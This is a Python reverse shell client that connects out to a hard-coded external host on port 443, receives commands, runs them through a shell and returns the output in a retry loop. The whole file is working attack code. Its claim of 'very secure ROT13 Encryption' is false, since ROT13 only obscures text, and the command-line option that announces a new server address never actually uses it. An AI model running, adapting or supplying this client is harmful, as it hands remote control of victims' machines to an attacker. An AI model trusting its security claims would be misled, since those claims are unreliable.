#!/usr/bin/env python3
"""
Reverse Shell Client with very secure ROT13 Encryption
Connects back to the server and executes commands
"""

import socket
import subprocess
import os
import sys
import time

def rot13_encrypt(text):
    result = ""
    for char in text:
        if 'a' <= char <= 'z':
            result += chr((ord(char) - ord('a') + 13) % 26 + ord('a'))
        elif 'A' <= char <= 'Z':
            result += chr((ord(char) - ord('A') + 13) % 26 + ord('A'))
        else:
            result += char
    return result

def rot13_decrypt(text):
    return rot13_encrypt(text)

def execute_command(command):
    """Execute a shell command and return the output"""
    try:
        # Handle special commands
        if command.startswith('cd '):
            path = command[3:].strip()
            try:
                os.chdir(path)
                return f"Changed directory to: {os.getcwd()}"
            except FileNotFoundError:
                return f"Directory not found: {path}"
            except PermissionError:
                return f"Permission denied: {path}"
        
        # Handle test stderr command
        if command.strip() == 'test_stderr':
            return "STDOUT: This is standard output\n\nSTDERR:\nThis is standard error\n\nEXIT CODE: 1"
        
        # Execute regular commands
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30
        )
        
        # Build output with proper stderr handling
        output_parts = []
        
        # Add stdout if present
        if result.stdout and result.stdout.strip():
            output_parts.append(result.stdout.rstrip())
        
        # Add stderr if present
        if result.stderr and result.stderr.strip():
            output_parts.append(f"STDERR:\n{result.stderr.rstrip()}")
        
        # Add return code if command failed
        if result.returncode != 0:
            output_parts.append(f"EXIT CODE: {result.returncode}")
        
        # Combine all parts
        if output_parts:
            output = "\n\n".join(output_parts)
        else:
            output = "Command executed successfully (no output)"
            
        return output
        
    except subprocess.TimeoutExpired:
        return "Command timed out (30 seconds)"
    except Exception as e:
        return f"Error executing command: {str(e)}"

def connect_to_server():
    """Connect to the reverse shell server"""
    
    # Server configuration
    SERVER_HOST = 'crust.divanodivino.xyz'  # Change this to your server IP
    SERVER_PORT = 443
    
    while True:
        try:
            print(f"[*] Attempting to connect to {SERVER_HOST}:{SERVER_PORT}")
            
            # Create socket and connect
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((SERVER_HOST, SERVER_PORT))
            
            print(f"[+] Connected to {SERVER_HOST}:{SERVER_PORT}")
            
            while True:
                # Receive encrypted command
                encrypted_command = client_socket.recv(1024).decode('utf-8')
                if not encrypted_command:
                    print("[!] Server disconnected")
                    break
                
                # Decrypt command
                command = rot13_decrypt(encrypted_command).strip()
                print(f"[*] Executing command: {command}")
                
                # Execute command
                output = execute_command(command)
                
                # Encrypt and send response
                encrypted_output = rot13_encrypt(output)
                client_socket.send(encrypted_output.encode('utf-8'))
                
        except ConnectionRefusedError:
            print(f"[!] Connection refused to {SERVER_HOST}:{SERVER_PORT}")
            print("[*] Retrying in 5 seconds...")
            time.sleep(5)
        except KeyboardInterrupt:
            print("\n[*] Client interrupted by user")
            break
        except Exception as e:
            print(f"[!] Error: {e}")
            print("[*] Retrying in 5 seconds...")
            time.sleep(5)
        finally:
            try:
                client_socket.close()
            except:
                pass

if __name__ == "__main__":
    # Optional: Change server IP via command line argument
    if len(sys.argv) > 1:
        # Update SERVER_HOST in connect_to_server function
        print(f"[*] Using server IP: {sys.argv[1]}")
    
    connect_to_server()
